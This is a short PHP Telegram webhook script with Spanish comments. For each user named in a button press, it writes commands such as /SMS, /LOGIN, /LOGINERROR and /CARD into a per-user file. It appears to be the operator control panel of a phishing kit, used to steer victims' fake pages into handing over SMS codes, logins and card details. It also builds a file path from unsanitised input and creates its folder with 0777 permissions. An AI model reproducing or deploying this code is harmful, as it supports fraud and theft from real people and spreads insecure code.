<?php
// ===== bot.php =====
include("settings.php");

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (isset($update['callback_query'])) {
    $data = $update['callback_query']['data']; // Ej: "SMS|usuario123"
    $chat_id = $update['callback_query']['message']['chat']['id'];
    $callback_id = $update['callback_query']['id'];

    if (strpos($data, '|') !== false) {
        list($comando, $usuario) = explode('|', $data);

        if (!file_exists("acciones")) {
            mkdir("acciones", 0777, true);
        }

        $archivo = "acciones/$usuario.txt";

        switch ($comando) {
            case "SMS":
                file_put_contents($archivo, "/SMS");
                break;
            case "SMSERROR":
                file_put_contents($archivo, "/SMSERROR");
                break;
            case "NUMERO":
                file_put_contents($archivo, "/NUMERO");
                break;
            case "ERROR":
                file_put_contents($archivo, "/ERROR");
                break;
            case "LOGIN":
                file_put_contents($archivo, "/LOGIN");
                break;
            case "LOGINERROR":
                file_put_contents($archivo, "/LOGINERROR");
                break;
            case "CARD":
                file_put_contents($archivo, "/CARD");
                break;
            default:
                file_put_contents($archivo, "/ERROR");
                break;
        }

        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            'callback_query_id' => $callback_id,
            'text' => "✅ Acción enviada para $usuario",
            'show_alert' => false
        ]));
    }
}
?>
